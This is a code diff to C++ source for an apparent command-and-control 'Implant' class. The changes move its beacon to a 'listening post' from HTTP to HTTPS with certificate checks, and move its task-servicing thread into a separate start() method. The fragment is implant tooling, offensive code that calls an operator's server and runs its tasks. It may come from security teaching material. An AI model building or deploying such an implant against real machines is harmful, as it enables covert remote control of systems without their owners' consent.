@@ -33,14 +33,27 @@ using json = nlohmann::json;
 
     //construct listening post endpoint URL, only HTTp
     std::stringstream ss;
-    ss << "http://" << serverAddress << ":" << serverPort << serverUri;
+    ss << "https://" << serverAddress << ":" << serverPort << serverUri;
     std::string fullServerUrl = ss.str();
 
-    //make an async HTTP POST req. to listening post
-    cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
+
+
+    cpr::AsyncResponse asyncRequest = cpr::PostAsync(
+        cpr::Url{ fullServerUrl },
         cpr::Body{ requestBody.dump() },
-        cpr::Header{ {"Content-Type", "application/json"} }
+        cpr::Header{ {"Content-Type", "application/json"} },
+        cpr::ssl::VerifyHost{ true },       // verify server hostname
+        cpr::ssl::VerifyPeer{ true },       // verify server certificate
+        cpr::CertInfo{ "cert.pem" }  // path to CA cert bundle
     );
+
+
+
+    // //make an async HTTP POST req. to listening post
+    // cpr::AsyncResponse asyncRequest = cpr::PostAsync(cpr::Url{ fullServerUrl },
+    //     cpr::Body{ requestBody.dump() },
+    //     cpr::Header{ {"Content-Type", "application/json"} }
+    // );
 
     //retrieve response
     cpr::Response response = asyncRequest.get();
@@ -155,8 +168,14 @@ Implant::Implant(std::string host, std::string port, std::string uri) :
     uri{ std::move(uri) },
 
     isRunning{ true },
-    dwellDistributionSeconds{ 1. },
+    dwellDistributionSeconds{ 1. }
 
-    taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } {
+    // taskThread{ std::async(std::launch::async, [this] { serviceTasks(); }) } 
+{
+}
 
+void Implant::start() {
+    taskThread = std::async(std::launch::async, [this] {
+        serviceTasks();
+    });
 }
